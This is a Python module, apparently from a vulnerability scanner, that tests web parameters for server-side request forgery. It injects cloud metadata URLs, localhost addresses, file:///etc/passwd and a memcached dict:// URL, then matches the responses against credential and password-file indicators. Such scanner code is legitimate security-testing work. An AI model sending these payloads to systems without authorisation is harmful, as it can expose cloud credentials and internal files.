"""SSRF Verification Module.

Tests for Server-Side Request Forgery by injecting internal URLs
and cloud metadata endpoints, then checking if the response contains
internal data.
"""
import logging
from app.ai_assistant.verification.base_module import BaseVerificationModule

logger = logging.getLogger(__name__)


class SSRFModule(BaseVerificationModule):
    """SSRF verification module."""

    VULN_TYPE = "SSRF"
    KEYWORD = "ssrf"

    # Cloud metadata endpoints that should not be accessible
    PAYLOADS = [
        'http://169.254.169.254/latest/meta-data/',
        'http://169.254.169.254/computeMetadata/v1/',
        'http://metadata.google.internal/computeMetadata/v1/',
        'http://127.0.0.1:80/',
        'http://localhost:80/',
        'http://[::1]/',
        'http://0.0.0.0/',
        'file:///etc/passwd',
        'dict://localhost:11211/stats',
    ]

    # Indicators that SSRF was successful
    SSRF_INDICATORS = [
        'ami-id', 'instance-id', 'security-credentials',  # AWS
        'computeMetadata', 'project-id',                  # GCP
        'root:x:', 'root:$',                              # file:// /etc/passwd
        'STAT pid', 'version',                           # memcached
        'iis', 'apache', 'nginx',                        # localhost services
        'x-amz', 'ami-id',                               # AWS specific
    ]

    def generate_payloads(self):
        """Generate SSRF test payloads."""
        return self.PAYLOADS

    def verify(self, param_name, location, method):
        """Run SSRF verification."""
        payloads = self.generate_payloads()

        for payload in payloads:
            resp = self._send_request(param_name, payload, method)
            if not resp:
                continue

            evidence = self.collect_evidence(resp, payload)
            if evidence:
                confidence = self.calculate_confidence(evidence)

                return self._build_result(
                    status='verified' if confidence >= 0.8 else 'potential',
                    param_name=param_name,
                    location=location,
                    method=method,
                    payload=payload,
                    evidence=evidence,
                    confidence=confidence,
                    technique='Internal Resource Fetch Detection',
                    request_sent=resp.url,
                    response_summary=f"Status: {resp.status_code}, Length: {len(resp.text)}",
                )

        return self._build_result(
            status='not_vulnerable',
            param_name=param_name,
            location=location,
            method=method,
            payload=payloads[0] if payloads else '',
            evidence='No internal resources were fetched or reflected.',
            confidence=0.0,
            technique='Internal Resource Fetch Detection',
        )

    def collect_evidence(self, response, payload, baseline_response=None):
        """Check for SSRF indicators in the response."""
        resp_text = response.text.lower()

        # Check for cloud metadata responses
        if '169.254.169.254' in payload:
            if any(indicator in resp_text for indicator in ['ami-id', 'instance-id', 'security-credentials', 'computemetadata']):
                return f"SSRF confirmed: Cloud metadata endpoint was fetched. Payload: {payload}"

        # Check for file:///etc/passwd
        if 'file://' in payload:
            if 'root:x:' in resp_text or 'root:$' in resp_text:
                return f"SSRF confirmed: Local file accessed via file:// protocol. Payload: {payload}"

        # Check for dict:// (memcached)
        if 'dict://' in payload:
            if 'stat pid' in resp_text or 'version' in resp_text:
                return f"SSRF confirmed: Internal service (memcached) accessed. Payload: {payload}"

        # Check for localhost services
        if '127.0.0.1' in payload or 'localhost' in payload:
            # If response is significantly different from baseline or contains server headers
            if baseline_response and len(response.text) != len(baseline_response.text):
                if any(indicator in resp_text for indicator in ['iis', 'apache', 'nginx', 'server at']):
                    return f"SSRF Potential: Internal service response detected. Payload: {payload}"

        return None

    def calculate_confidence(self, evidence):
        """Calculate confidence."""
        if 'metadata' in evidence.lower():
            return 1.0
        if 'file://' in evidence.lower() or 'root:x:' in evidence.lower():
            return 1.0
        if 'dict://' in evidence.lower():
            return 0.9
        if 'internal service' in evidence.lower():
            return 0.7
        return 0.3
